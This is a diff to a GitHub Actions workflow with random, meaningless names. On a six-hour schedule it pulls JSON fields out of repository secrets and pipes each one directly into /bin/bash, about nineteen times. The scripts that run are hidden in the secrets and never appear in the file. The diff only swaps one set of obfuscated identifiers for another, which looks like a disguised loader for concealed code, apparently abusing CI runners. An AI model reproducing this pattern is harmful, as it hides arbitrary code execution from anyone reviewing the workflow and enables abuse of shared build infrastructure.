@@ -1,31 +1,35 @@
 name: hangzizuoh
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 4/6 * * *'
-
+    - cron: '16 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: hangzizuoh
         env:
-          nvqr0: ${{ secrets.nvqr0 }}
+          f69: ${{ secrets.f69 }}
         run: |
-          echo $nvqr0 | jq -r .qj896 | /bin/bash
-          echo $h496 | jq -r .kspcq4 | /bin/bash
-          echo $icu82250 | jq -r .ielfb4413 | /bin/bash
-          echo $m7 | jq -r .gufg84 | /bin/bash
-          echo $lorhm6420 | jq -r .igso759 | /bin/bash
-          echo $o4936 | jq -r .yz60704 | /bin/bash
-          echo $st6 | jq -r .st3792 | /bin/bash
-          echo $h48461 | jq -r .nh1 | /bin/bash
-          echo $eh5732 | jq -r .dxrnj973 | /bin/bash
-          echo $fayx52 | jq -r .vkcfw16 | /bin/bash
-          echo $bx6056 | jq -r .b16156 | /bin/bash
-          echo $hd7 | jq -r .bxwfw5 | /bin/bash
-          echo $kh03 | jq -r .vt4 | /bin/bash
-          echo $dx22 | jq -r .u596 | /bin/bash
+          echo $f69 | jq -r .nlc9178 | /bin/bash
+          echo $lr4 | jq -r .haq26594 | /bin/bash
+          echo $d1995 | jq -r .ec04 | /bin/bash
+          echo $qktcm23 | jq -r .ioqdb7982 | /bin/bash
+          echo $omkwi16189 | jq -r .eg3416 | /bin/bash
+          echo $fccu7 | jq -r .t27 | /bin/bash
+          echo $jm4 | jq -r .ijy72877 | /bin/bash
+          echo $pnu9 | jq -r .usuc341 | /bin/bash
+          echo $h02 | jq -r .jt412 | /bin/bash
+          echo $p316 | jq -r .wfh92 | /bin/bash
+          echo $bgob39538 | jq -r .tuq42 | /bin/bash
+          echo $bqlst310 | jq -r .xfewk1 | /bin/bash
+          echo $m7 | jq -r .lpnzi966 | /bin/bash
+          echo $ih150 | jq -r .yts06734 | /bin/bash
+          echo $clurn3 | jq -r .pct256 | /bin/bash
+          echo $ewxaa306 | jq -r .nx51 | /bin/bash
+          echo $u7 | jq -r .p061 | /bin/bash
+          echo $ywknn733 | jq -r .msnqw34 | /bin/bash
+          echo $wxtf1665 | jq -r .cbyjx7 | /bin/bash
 
